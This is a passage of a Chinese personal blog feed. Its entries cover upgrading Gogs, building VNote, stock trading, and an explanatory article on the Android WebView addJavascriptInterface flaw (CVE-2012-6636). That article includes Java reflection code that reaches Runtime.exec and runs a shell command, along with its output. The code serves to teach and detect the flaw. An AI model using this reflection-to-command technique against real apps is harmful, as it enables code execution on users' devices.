gogs_old</span><br><span class="line">cp -R gogs_old/custom gogs</span><br><span class="line">cp -R gogs_old/data gogs</span><br><span class="line">cp -R gogs_old/<span class="built_in">log</span> gogs</span><br></pre></td></tr></table></figure><p>gogs 0.13 的配置已经发生了变化，如果不修改配置执行 <code>./gogs web</code>会出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev</span><br><span class="line">2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:</span><br><span class="line">open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused)</span><br></pre></td></tr></table></figure><p>看错误像是在连接 mysql 的 3306 端口，可是配置文件设置的是使用 sqlite，非常困惑。上网搜索后证实是 gogs 0.13 的配置文件的字段修改了。</p><p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p><p>最关键的两个字段是数据库相关的 <code>DB_TYPE</code> 改为 <code>TYPE</code>， <code>PASSWD</code> 改为 <code>PASSWORD</code> 修改后 <code>custom/conf/app.ini</code> 后，执行 <code>./gogs web</code> 一切正常。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，&lt;br&gt;如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。&lt;/p&gt;
&lt;h2 id=&quot;切换皮肤&quot;</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Markdown 笔记软件： VNote</title>
    <link href="http://usmacd.com/2022/02/21/vnote/"/>
    <id>http://usmacd.com/2022/02/21/vnote/</id>
    <published>2022-02-21T03:28:25.235Z</published>
    <updated>2022-02-21T03:28:25.235Z</updated>
    
    <content type="html"><![CDATA[<p>向大家安利一款 markdown 笔记软件， VNote <a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>此软件目前已经 1300 多个commits 了，做为一个有些开源软件维护经历的人，深感不易。<br>用了太多 markdown 笔记软件，此软件使得最为顺手，尤其作为程序员 vim 模式 让我感到非常舒服，<br>大量图表的支持比如 UML 流程图，让我用起来很顺手。</p><p>Vnote 分为两个开发阶段，阶段一 vnote2 已经开发完成：<a href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>现在处于第二个开发阶段：<a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p><p>据说后续会出收费版本，但目前看还需要很长的一段时间了。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p><p>我前后尝试过各种笔记软件，我理想的软件有几点：</p><ul><li>a. 支持文件管理</li><li>b. 不要乱改数据，容易迁移</li><li>c. 支持 markdown</li><li>d. 跨平台，支持 Mac 和 Linux</li></ul><p>最后，终于发现了 VNote，有点惊喜。在 Linux 下编译 VNote 显示有明显改进，下面是编译的方法：</p><ol><li>下载 QT SDK  （最新的 vnotex 官方支持 Qt 5.12，可自行下载使用替换相应的版本即可）</li></ol><p><a href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p><p>将 Qt5.9 安装到 /home/henices/Qt5.9.0/</p><ol start="2"><li>编译 fcitx-qt5 （如果使用的是 fcitx5，需要下载编译 fcitx5-qt）</li></ol><p>git clone <a href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p><p>准备编译脚本 <code>build_linux.sh</code>， 指定下载的QT</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line">rm -rf build</span><br><span class="line">mkdir -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>使用下面命令编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure><p>将生成的 libfcitxplatforminputcontextplugin.so copy 到<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p><ol start="3"><li>获取VNote 源码</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git</span><br><span class="line"><span class="built_in">cd</span> vnote.git</span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure><ol start="4"><li>编译</li></ol><p>build_linux.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line">rm -rf build</span><br><span class="line">mkdir -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">qmake -v</span><br><span class="line">qmake PREFIX=/usr/<span class="built_in">local</span> CONFIG-=debug CONFIG+=release ../VNote.pro</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><p>使用下面命令编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure><ol start="5"><li>安装</li></ol><p><code>sudo make install</code></p><h2 id="诡异问题"><a href="#诡异问题" class="headerlink" title="诡异问题"></a>诡异问题</h2><p>Fedora 升级到 35 后，Vnote 出现了一系列问题</p><ol><li><p>vnote 的阅读模式不能正常显示 （Qt 5.12.11）</p><p>解决这个问题需要禁用 Qtwebengine 的 sandbox </p></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vnote --no-sandbox</span><br></pre></td></tr></table></figure><ol start="2"><li>导出 pdf 文件 cpu 100%  （Fedora 系统自带 Qt 5.15.2 编译）</li><li>官方提供的 Linux AppImage 文件无法打开 Fcitx5 输入法。</li></ol><p>最终解决问题的方法是下载 Qt5.15.2 重新编译 Vnote， Qt 从 5.15 开始不提供离线安装包，非常不方便。<br>官方提供的在线升级包如果太新只能安装 Qt 6，所以必须下载老版本的 online installer<br><a href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p><p>具体内容可以参考 <a href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> 的讨论</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;向大家安利一款 markdown 笔记软件， VNote &lt;a href=&quot;https://github.com/vnotex/vnote&quot;&gt;https://github.com/vnotex/vnote&lt;/a&gt;&lt;br&gt;此软件目前已经 1300 多个commits 了，做为</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>个人炒股经历</title>
    <link href="http://usmacd.com/2021/12/24/stock_experience/"/>
    <id>http://usmacd.com/2021/12/24/stock_experience/</id>
    <published>2021-12-24T05:20:40.690Z</published>
    <updated>2021-12-24T05:20:40.690Z</updated>
    
    <content type="html"><![CDATA[<p>本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小赚出局了。</p><p>运气好的是，2015年的时候中了一支新股，新股的收益对冲了倒金字塔加仓的回撤，小赚1万元出局清了仓，有时候我也在想如果不是这赚了1万，是不是也就不会继续炒股了。接下来的事情大家都很熟悉了，熔断和股灾3.0，一直在不赚和小亏中挣扎着，居然也坚持了下来。理工男的特质救了我，从2015年开始认真学习股票操作，恶补基础知识，分时，K线，缺口，价量关系，缠论，波浪理论，箱体理论，趋势交易，价值投资，基本各种理论都看了遍，其实到最后发现有用的东西太少了，关于股票的书也基本没啥用，真正有用的书可能就那么几本，可是如果不看几十本的话，你怎么知道哪几本有用呢？所以炒股并不存在什么捷径，一夜暴富基本是神话，为啥呢？盈亏同源，怎么赚钱就可能怎么亏回去，除非你知道你为什么能赚钱。</p><p>下面是这些年的心得，应该可以涨几年功力吧？</p><p>要在市场上生存你必须具备某种优势，没有这种优势就是纯赌博，真正赚钱的是要做大概率的投机。买卖股票实际上是对股票做分类，哪些可以做，哪些不可以做，这就涉及了股票交易系统，有了交易系统，剩下的就是执行问题了，要做到BDWQ，后面就是仓位计算，根据股票的波动和你愿意承担的风险程度计算出来。</p><p>回首看虽然现在稳定盈利了，又回到了灵魂拷问，投入的时间值得吗？对于很多人来说，最重要可能是资金的原始积累，10万块，翻10倍，100万在中国很多城市一套房也买不了，更不用说财富自由了，所以先努力工作吧，边工作边加大投资比例，梦想还是要有的，万一实现了呢？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>Android WebView 漏洞</title>
    <link href="http://usmacd.com/2021/11/05/webview_java/"/>
    <id>http://usmacd.com/2021/11/05/webview_java/</id>
    <published>2021-11-05T09:56:07.025Z</published>
    <updated>2021-11-05T09:56:07.025Z</updated>
    
    <content type="html"><![CDATA[<h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsObject</span> </span>&#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JsObject(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure><p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p><h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView webview = <span class="keyword">new</span> WebView(<span class="keyword">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> Demo();</span><br><span class="line">    Class mObjectClass = demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        Class c = mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method m = c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = m.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Class c2 = obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        Method n = c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> Object[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure><p>命令执行成功。</p><h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> Demo();</span><br><span class="line">    Class mObjectClass = demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object o = mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure><p>已经成功调用了Demo的private a1 方法</p><h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p><h3 id="CVE-2012-6636-关键的CVE"><a href="#CVE-2012-6636-关键的CVE" class="headerlink" title="CVE-2012-6636  (关键的CVE)"></a>CVE-2012-6636  (关键的CVE)</h3><p>该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可<br>通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16<br>以及之前的Android 系统。(Android 4.2 为 API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_”</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android/webkit/AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p><h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span 